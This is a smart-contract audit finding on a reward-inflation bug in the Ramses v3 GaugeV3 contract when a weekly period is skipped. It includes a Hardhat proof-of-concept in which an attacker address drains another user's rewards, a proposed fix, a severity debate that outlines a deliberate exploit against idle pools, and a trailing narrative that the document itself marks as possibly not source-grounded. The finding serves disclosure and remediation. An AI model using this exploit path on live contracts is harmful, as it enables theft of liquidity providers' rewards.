---
id: 22152
severity: "Medium"
---

# Inflated `GaugeV3` rewards when period is skipped

## Description

```solidity
function periodCumulativesInside(/* ... */) /* ... */ {
    // ...
    if (lastTick < tickLower) {
        // ...
    } else if (lastTick < tickUpper) {
        // ...
        if (currentPeriod <= period) {
            // ...
        } else {
            cache.secondsPerLiquidityCumulativeX128 = $.periods[period].endSecondsPerLiquidityPeriodX128;
        }
        return
            cache.secondsPerLiquidityCumulativeX128 -
            snapshot.secondsPerLiquidityOutsideLowerX128 -
            snapshot.secondsPerLiquidityOutsideUpperX128;
    } else {
        // ...
    }
}
```
```solidity
function _advancePeriod() /* ... */ {
    // ...
    if ((_blockTimestamp() / 1 weeks) != _lastPeriod) {
        // ...
        uint160 secondsPerLiquidityCumulativeX128 = Oracle.newPeriod(
            $.observations,
            _slot0.observationIndex,
            period
        );
        // ...
        $.periods[_lastPeriod].endSecondsPerLiquidityPeriodX128 = secondsPerLiquidityCumulativeX128;
        // ...
    }
}
```
```solidity
function newPeriod(/* ... */) /* ... */ {
    // ...
    uint32 delta = uint32(period) * 1 weeks - 1 - last.blockTimestamp;
    secondsPerLiquidityCumulativeX128 =
        last.secondsPerLiquidityCumulativeX128 +
        ((uint160(delta) << 128) / ($.liquidity > 0 ? $.liquidity : 1));
    // ...
}
```
The `GaugeV3` contract distributes rewards based on the proportion of liquidity that each position had in range over each 1-week “period”. This is calculated by `cachePeriodEarned()` in the gauge, which calls `positionPeriodSecondsInRange()` on the `RamsesV3Pool`. A key part of this calculation is the `periodCumulativesInside()` function, which computes the total seconds per liquidity within a tick range for that period.

In `periodCumulativesInside()`, one sub-case occurs when the period is in the past, and the tick range was active at the end of that period.

Notice that this sub-case relies on `$.periods[period].endSecondsPerLiquidityPeriodX128`, which is meant to represent the total seconds per liquidity when the period ended. However, this value is actually more accurately described as “the seconds per liquidity at the start of the next period”, which can be seen in how `_advancePeriod()` and `newPeriod()` are implemented.

So, this means that if a period is skipped (meaning no activity happens in the pool during the period), the next time `_advancePeriod()` is called, the `endSecondsPerLiquidityPeriodX128` for the last period will be set to just before the start of the period after the skipped period. This is effectively one week after the last period actually ended. This adds extra time to the sub-case mentioned above, which leads to inflated rewards for users.

## Proof of Concept

```solidity
import { ethers } from "hardhat";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { testFixture } from "../../scripts/deployment/testFixture";
import { expect } from "../uniswapV3CoreTests/shared/expect";
import * as helpers from "@nomicfoundation/hardhat-network-helpers";
import { createPoolFunctions } from "../uniswapV3CoreTests/shared/utilities";

const testStartTimestamp = Math.floor(new Date("2030-01-01").valueOf() / 1000);

describe("Code4rena Contest", () => {
    let c: Awaited<ReturnType<typeof auditTestFixture>>;
    let wallet: HardhatEthersSigner;
    let attacker: HardhatEthersSigner;
    const fixture = testFixture;

    async function auditTestFixture() {
        const suite = await loadFixture(fixture);
        [wallet, attacker] = await ethers.getSigners();

        const pool = suite.clPool;

        const swapTarget = await (
            await ethers.getContractFactory(
                "contracts/CL/core/test/TestRamsesV3Callee.sol:TestRamsesV3Callee",
            )
        ).deploy();

        const {
            swapToLowerPrice,
            swapToHigherPrice,
            swapExact0For1,
            swap0ForExact1,
            swapExact1For0,
            swap1ForExact0,
            mint,
            flash,
        } = createPoolFunctions({
            token0: suite.usdc,
            token1: suite.usdt,
            swapTarget: swapTarget,
            pool,
        });

        return {
            ...suite,
            pool,
            swapTarget,
            swapToLowerPrice,
            swapToHigherPrice,
            swapExact0For1,
            swap0ForExact1,
            swapExact1For0,
            swap1ForExact0,
            mint,
            flash,
        };
    }

    describe("Proof of concepts", () => {

        beforeEach("setup", async () => {
            c = await loadFixture(auditTestFixture);
            [wallet, attacker] = await ethers.getSigners();
        });

        it("Inflated multi-week gauge rewards", async () => {

            console.log("-------------------- START --------------------");

            const startPeriod: number = Math.floor(testStartTimestamp / 604800) + 1;
            const startPeriodTime = startPeriod * 604800;
            const secondPeriodTime: number = (startPeriod + 1) * 604800;
            const thirdPeriodTime: number = (startPeriod + 2) * 604800;

            // Begin at the very start of a period
            await helpers.time.increaseTo(startPeriodTime);
            console.log("Liquidity start", await c.pool.liquidity());
            console.log("Tick start", (await c.pool.slot0()).tick);

            // Begin by minting two positions, both with 100 liquidity in the same range
            await c.mint(wallet.address, 0n, -10, 10, 100n)
            await c.mint(attacker.address, 0n, -10, 10, 100n)
            console.log("Liquidity after", await c.pool.liquidity());

            // Also add 10 tokens as a gauge reward for this period
            await c.usdc.approve(c.clGauge, ethers.MaxUint256);
            await c.clGauge.notifyRewardAmount(c.usdc, ethers.parseEther("10"))   

            // Increase to the next period
            await helpers.time.increaseTo(secondPeriodTime);

            // See how much the two positions have earned, should be basically 50 USDC each
            const walletEarned1 = await c.clGauge.periodEarned(startPeriod, c.usdc, wallet.address, 0, -10, 10);
            const attackerEarned1 = await c.clGauge.periodEarned(startPeriod, c.usdc, attacker.address, 0, -10, 10);
            const tokenTotalSupplyByPeriod = await c.clGauge.tokenTotalSupplyByPeriod(startPeriod, c.usdc);

            console.log("walletEarned1", walletEarned1);
            console.log("attackerEarned1", attackerEarned1);
            console.log("tokenTotalSupplyByPeriod", tokenTotalSupplyByPeriod);

            // Notice that anyone can cache the "wallet" address earned amount. This will "lock in" that
            // the wallet address has earned ~50 USDC.
            await c.clGauge.cachePeriodEarned(startPeriod, c.usdc, wallet.address, 0, -10, 10, true);

            // Now if a whole period goes by, the "endSecondsPerLiquidityPeriodX128" for the startPeriod will be
            // set too far in the future, and the attacker will end up getting double the rewards they should.
            await helpers.time.increaseTo(thirdPeriodTime);
            await c.clPool._advancePeriod();

            const attackerEarned2 = await c.clGauge.periodEarned(startPeriod, c.usdc, attacker.address, 0, -10, 10);
            console.log("attackerEarned2", attackerEarned2);
            const attackerBalanceBefore = await c.usdc.balanceOf(attacker.address);
            await c.clGauge.connect(attacker).getPeriodReward(startPeriod, [c.usdc], attacker.address, 0, -10, 10, attacker.address);
            const attackerBalanceAfter = await c.usdc.balanceOf(attacker.address);
            console.log("attacker claim amount", attackerBalanceAfter - attackerBalanceBefore);

            // This is all at the expense of the wallet address, because they had their rewards "locked in" and 
            // can't benefit from the bug, and moreover will not be able to claim anything because the attacker
            // took all the tokens
            const walletEarned2 = await c.clGauge.periodEarned(startPeriod, c.usdc, wallet.address, 0, -10, 10);
            console.log("walletEarned2", walletEarned2);
            await expect(
                c.clGauge.connect(wallet).getPeriodReward(startPeriod, [c.usdc], wallet.address, 0, -10, 10, wallet.address)
            ).to.be.revertedWithCustomError(c.usdc, 'ERC20InsufficientBalance');

            console.log("-------------------- END --------------------");
        });
    });
});
```
By running `npx hardhat test --grep "Code4rena Contest"`, the following output can be seen:
```
-------------------- START --------------------
Liquidity start 0n
Tick start 0n
Liquidity after 200n
walletEarned1 4999991732804232804n
attackerEarned1 4999991732804232804n
tokenTotalSupplyByPeriod 10000000000000000000n
attackerEarned2 9999991732804232804n
attacker claim amount 9999991732804232804n
walletEarned2 4999991732804232804n
-------------------- END --------------------
    ✔ Inflated multi-week gauge rewards (81ms)
```
This output shows that the attacker can claim double their intended rewards at the expense of another user.

## Recommendation

```solidity
function _advancePeriod() /* ... */ {
    // ...
    if ((_blockTimestamp() / 1 weeks) != _lastPeriod) {
        // ...
        uint160 secondsPerLiquidityCumulativeX128 = Oracle.newPeriod(
            $.observations,
            _slot0.observationIndex,
            _lastPeriod // << CHANGE: pass _lastPeriod instead of period
        );
        // ...
        $.periods[_lastPeriod].endSecondsPerLiquidityPeriodX128 = secondsPerLiquidityCumulativeX128;
        // ...
    }
}
```
```solidity
function newPeriod(/* ... */) /* ... */ {
    // ...
    uint32 delta = uint32(period + 1) * 1 weeks - 1 - last.blockTimestamp; // << CHANGE: use end of period instead of start
    secondsPerLiquidityCumulativeX128 =
        last.secondsPerLiquidityCumulativeX128 +
        ((uint160(delta) << 128) / ($.liquidity > 0 ? $.liquidity : 1));
    // ...
}
```
One initial idea for a fix might be to modify `_advancePeriod()` and `newPeriod()` to only extrapolate the seconds per liquidity up to the end of the period, rather than to the start of the next period.

However, the current behavior of `endSecondsPerLiquidityPeriodX128` is actually important to maintain for the following logic in `periodCumulativesInside()`:
```solidity
function periodCumulativesInside(/* ... */) /* ... */ {
    // ...
    snapshot.secondsPerLiquidityOutsideLowerX128 = uint160(lower.periodSecondsPerLiquidityOutsideX128[period]);
    if (tickLower <= startTick && snapshot.secondsPerLiquidityOutsideLowerX128 == 0) {
        snapshot.secondsPerLiquidityOutsideLowerX128 = $
            .periods[previousPeriod]
            .endSecondsPerLiquidityPeriodX128;
    }

    snapshot.secondsPerLiquidityOutsideUpperX128 = uint160(upper.periodSecondsPerLiquidityOutsideX128[period]);
    if (tickUpper <= startTick && snapshot.secondsPerLiquidityOutsideUpperX128 == 0) {
        snapshot.secondsPerLiquidityOutsideUpperX128 = $
            .periods[previousPeriod]
            .endSecondsPerLiquidityPeriodX128;
    }
    // ...
}
```
So, it is instead recommended to introduce separate `startSecondsPerLiquidityPeriodX128` and `endSecondsPerLiquidityPeriodX128` variables in the `PeriodInfo` struct, so that the code can correctly distinguish between the two different time points in the calculations.

`_advancePeriod` is public and this issue also seems to be possible on pool with no activity at all.  
cc @keccakdog 

@gzeon - In `GaugeV3::notifyRewardAmount()`, `_advancePeriod()` is called at the start of the function. This means if there are any gauge rewards for the week due to voting, advance period would be called.  
The one case this would occur is if someone called `notifyRewardAmountNextPeriod`, or the ”`forPeriod`” variant + had no votes for the week + had no swaps or liq adds or removes, for the entire week.  
As you can imagine this is a close to 0% chance of happening, since if there are rewards there is likely at least 1 interaction the entire period, or else these rewards are pointless. TLDR is this is a very very very very unlikely case (only possible if our entire project is dead and nobody is interacting 😓).  
It may be beneficial to document it or maybe add a safety check in case, but I do not find this as more than a Low finding at best since the assumption of our project being dead is essentially required for it work.

Hello judge/sponsor, thank you for your comments. I would like to escalate this issue for two reasons:

  1. I believe the bug has been misunderstood. The above comments are saying it’s unlikely for a period `p` to be skipped while still having gauge rewards, as `notifyRewardAmount()` triggers `_advancePeriod()`, so rewards for a skipped period would need to be given in advance using `notifyRewardAmountNextPeriod()` or `notifyRewardAmountForPeriod()`. However this argument is not relevant to the bug. With this bug, inflated rewards in period `p` are due to period `p+1` being skipped and not period `p` being skipped. This can be seen in the PoC - notice that a theft is demonstrated using `notifyRewardAmount()`, while `notifyRewardAmountNextPeriod()`/`notifyRewardAmountForPeriod()` are never used.
  2. The above comments are focusing on how likely the bug is to be triggered by accident, but the bug can also be exploited intentionally. For one example, an attacker could deploy a pool with minimal liquidity, allocate gauge rewards at the last moment before the period switch, and then simply wait as further periods pass. Since the attacker independently deployed the pool and only provided minimal liquidity, others would be unlikely to engage with it at first, and the inflated rewards would silently build up. This is especially dangerous if the attacker knows a pool might gain popularity later, for example by knowing that a partner protocol plans to incentivize liquidity for a specific token pair in the future. So, I believe this bug should not remain unaddressed, and is high severity and not QA.

Hey Riley, thank you for following up on this. While I see what you mean, the reason this was labeled a lesser severity is because the situation you are explaining is rather impossible. If there are meaningful rewards, at least ONE person would be LPing and interacting. Also, if there was lots of rewards and then nothing— the gauge would see people removing liquidity, which unless I’m mistaken, nullifies this. Someone making a pool last second and voting for it is fine since if it was somehow a malicious gauge it could be killed and prevent abuse. The system has lots of checks in place to prevent gaming like this, and non-active pools are not profitable for people to vote on, so the only way period P rewards would be significant and P+1 being completely empty would mean not a single interaction occurs in P+1, which as you can imagine is extremely unlikely that someone would vote for a pool with 0 rewards in hopes of attempting to get more gauge rewards, when others can join in and take the rewards during the period as well. Since the damage is a multiplier of the existing rewards being inflated in the future— the vulnerability requires heavy voting power to be worth anything.  
Hopefully that makes sense. I don’t disagree with your finding that it is possible; but I disagree on the severity being very low due to the likelihood being close to 0.

Hi @keccakdog - thank you for the follow-up. Since understanding the issue requires a lot of context, I would like to leave the following notes for the judge, and also respond to your points. Please feel free to correct me if I’m wrong in any of the following:  
\- I believe we’re in agreement that the initial comment that downgraded this issue is not relevant to this bug. However, note that the initial comment is relevant for [issue 40](https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/40).

\- Part of the most recent comment is a counter-argument to my example of how an attacker could intentionally exploit the bug. I have the following response to those points:  
_"If there are meaningful rewards, at least ONE person would be LPing and interacting."_  
This is why I think the attacker would allocate gauge rewards at the last moment before the period switch. This timing would leave no opportunity for others to react and compete for the rewards before the period ends, so there is no incentive-based reason for anyone to interact with the pool and inadvertently prevent the exploit.  
_"Also, if there was lots of rewards and then nothing— the gauge would see people removing liquidity, which unless I’m mistaken, nullifies this."_  
The attacker only needs to provide a few wei of liquidity, since they aren’t competing with anyone in the setup. So they incur no significant cost by abandoning their dust liquidity, and they could even choose to withdraw it in period `p+2` if needed.  
_"Someone making a pool last second and voting for it is fine since if it was somehow a malicious gauge it could be killed and prevent abuse."_  
I think this point addresses how the issue could be mitigated, which is separate from the severity of the issue itself. An admin can only prevent the issue if they are aware of the bug. Therefore I believe this finding should be considered high-severity.  
\- I believe the remaining part of the above comment argues that it’s unlikely for this bug to occur accidentally, which I agree with:  
_"The system has lots of checks in place to prevent gaming like this, and non-active pools are not profitable for people to vote on, so the only way period P rewards would be significant and P+1 being completely empty would mean not a single interaction occurs in P+1, which as you can imagine is extremely unlikely that someone would vote for a pool with 0 rewards in hopes of attempting to get more gauge rewards, when others can join in and take the rewards during the period as well. Since the damage is a multiplier of the existing rewards being inflated in the future— the vulnerability requires heavy voting power to be worth anything."_  

Thanks again for the consideration everyone.

This is a tough call, but I think it is still more appropriate to have this as low risk.  
The situation as described is very unlikely as the sponsor explained. There are protocol incentives to make sure pool with gauge should have at least some activity. So unless this can be intentionally exploited, I think this is really quite impossible.

Hi @gzeon, thanks for the follow-up. Apologies for all the back-and-forth, but I think there may be a misunderstanding.  
For this bug/exploit, no voting power is required. Notice that [the `notifyRewardAmount()` function](https://github.com/code-423n4/2024-10-ramses-exchange/blob/4a40eba36bc47eba8179d4f6203a4b84561a4415/contracts/CL/gauge/GaugeV3.sol#L147-L162) is permissionless, and in the PoC there is no voting power logic used.  
Of course calling `notifyRewardAmount()` is not free - anyone who calls it will be transferring their own tokens to the in-range LPs for the period. But in the case of the following:  
_"For one example, an attacker could deploy a pool with minimal liquidity, allocate gauge rewards at the last moment before the period switch, and then simply wait as further periods pass."_  
The attacker is the sole in-range LP, so calling `notifyRewardAmount()` is just a self-transfer to give themselves a reward balance in the gauge, which is the first step to exploiting this bug.  
Do you see what I mean? I still believe this issue is not low-severity, and I’m happy to expand on any other parts of the discussion if additional clarification is needed. Thanks again!

_"notifyRewardAmount() function is permissionless"_  
If the attacker choose to reward themselves, I don’t see that as an issue. While `Voter.sol` is out-of-scope, according to Ramses v3 [doc](https://v3-docs.ramses.exchange/pages/voter-escrow#earning-incentives-and-fees):  
_"A voting incentive is designated at anytime during the current EPOCH and paid out in lump sum at the start of the following EPOCH."_  
_"Once an LP incentive is deposited it will distribute that token and the amount deposited for the next 7 days."_  
So I think it is fair to assume it is expected to have reward to be notified near the start of a period. Any reward would incentivize LP activity and thus a period is unlikely to be skipped. Note even `p+1` does not have any reward, the lack of incentive is a incentive for LPs in `p` to remove liquidity, which also advances the period. If there are no other LP because the attacker is the sole LP, they would receive 100% of the reward regardless of this issue.  
Hence, it appears to me the incentives are well designed to make skipping a period `p` or `p+1` where `p` have non negligible incentive can be considered as impossible. 

Hi @gzeon thank you for the follow-up. I believe there’s still a misunderstanding.  
_"If the attacker choose to reward themselves, I don’t see that as an issue."_  
I agree - an attacker transferring funds to themselves isn’t inherently an exploit. However, the point I was making is this:  
_"calling notifyRewardAmount() is just a self-transfer to give themselves a reward balance in the gauge, which is the first step to exploiting this bug."_  
In other words, if an attacker rewards themselves right before the period switch, they spend nothing (since it’s a self-transfer), allocate rewards exclusively in period `p`, and the timing doesn’t leave any opportunity for others to be incentivized to LP and interfere. This leads into the next point:  
_"If there are no other LP because the attacker is the sole LP, they would receive 100% of the reward regardless of this issue."_  
I agree here as well, but since this is being used as a counter-argument to invalidate the finding, I think there’s a misunderstanding of the core bug. By establishing a reward balance in period `p`, the attacker gains an inflated reward balance with each subsequent skipped period. This is the main issue. 

_"identify an obsolete pool (it’s inevitable that at least one pool will become inactive over time) and use its gauge to initiate the exploit. Instead of setting up an inflated balance to exploit future users, this would allow the attacker to inflate their balance to steal any unclaimed rewards from past activity"_  
Alright I think I am getting convinced, this attack does seems to work; I previously thought it requires the pool to have no liquidity (contradict with leftover reward), it actually only requires no liquidity in the active tick. It is conceivable that an obsolete pool may have stale liquidity in an inactive range where the attacker can deposit 2 wei liquidity from 2 account in the active range, notify reward equal to the leftover at the last second of a period and hope for no activity for the next period. There are no cost (except gas) for this attack because the attacker own 100% of the active liquidity during the period they paid for the reward.  
In terms of severity, I think Medium is appropriate given the pre-condition required.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability consists of an inflation of gauge rewards when a weekly accounting period is skipped. The gauge distributes rewards proportionally to the amount of liquidity that each position held inside a tick range during each 1‑week period. The calculation relies on the function periodCumulativesInside, which obtains the cumulative seconds‑per‑liquidity value for the period from the field endSecondsPerLiquidityPeriodX128 stored in the PeriodInfo struct. However, endSecondsPerLiquidityPeriodX128 is written by _advancePeriod and newPeriod to represent the cumulative value at the start of the next period, not the true end of the current period. When a period experiences no activity – no swaps, no liquidity additions or removals – the contract does not advance the period until a later call to _advancePeriod (for example via notifyRewardAmount). At that moment the stored endSecondsPerLiquidityPeriodX128 for the skipped period is set to a timestamp that is one week later than it should be, effectively adding an extra week of seconds‑per‑liquidity to the calculation. As a result, the formula that multiplies seconds‑per‑liquidity by the position’s liquidity over‑counts the time the position was in range, causing the rewards for that period to be roughly doubled. An attacker can exploit this by (1) creating a pool with minimal liquidity, (2) calling notifyRewardAmount right before the period boundary to lock in a reward amount, (3) allowing the next period to remain completely idle, and (4) later invoking _advancePeriod to record the inflated cumulative value and claim the overstated reward. The attacker receives the extra tokens while other LPs who had previously earned a legitimate share see their claim reduced or become unable to claim because the gauge balance has been drained. The bug manifests only when a period is skipped, which is a rare but possible scenario, especially for newly deployed or low‑activity pools. From a user perspective the symptom is that a participant’s expected reward is missing or reduced, while another address can withdraw roughly twice the amount that was originally deposited as gauge rewards. The issue was discovered during a formal audit by reproducing the scenario in a test suite that advanced time across multiple weeks without any pool interaction. It is hard to notice because the reward numbers still appear plausible and the condition of a completely idle week does not raise an obvious alarm. The proper fix is to distinguish between the cumulative value at the start and at the end of each period – for example by adding separate startSecondsPerLiquidityPeriodX128 and endSecondsPerLiquidityPeriodX128 fields – and to compute the end value using the exact period boundary rather than the next period’s start. This ensures that periodCumulativesInside always uses the correct time window, eliminating the extra week of seconds‑per‑liquidity and preventing reward inflation.
